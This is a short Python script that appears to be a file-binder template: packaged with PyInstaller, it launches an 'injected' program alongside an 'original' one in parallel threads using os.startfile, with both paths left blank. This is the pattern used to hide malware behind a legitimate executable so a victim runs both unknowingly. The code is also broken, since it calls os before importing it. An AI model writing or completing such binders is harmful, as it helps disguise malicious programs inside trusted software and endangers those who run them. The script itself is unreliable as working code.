injected_program_path=''
original_program_path=''

import sys
bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
injected_program_path = os.path.abspath(os.path.join(bundle_dir, injected_program_path))
original_program_path = os.path.abspath(os.path.join(bundle_dir, original_program_path))

import os
import threading

def injected_program():
    os.startfile(injected_program_path)

def original_program():
    os.startfile(original_program_path)

threading.Thread(target=injected_program).start()
threading.Thread(target=original_program).start()
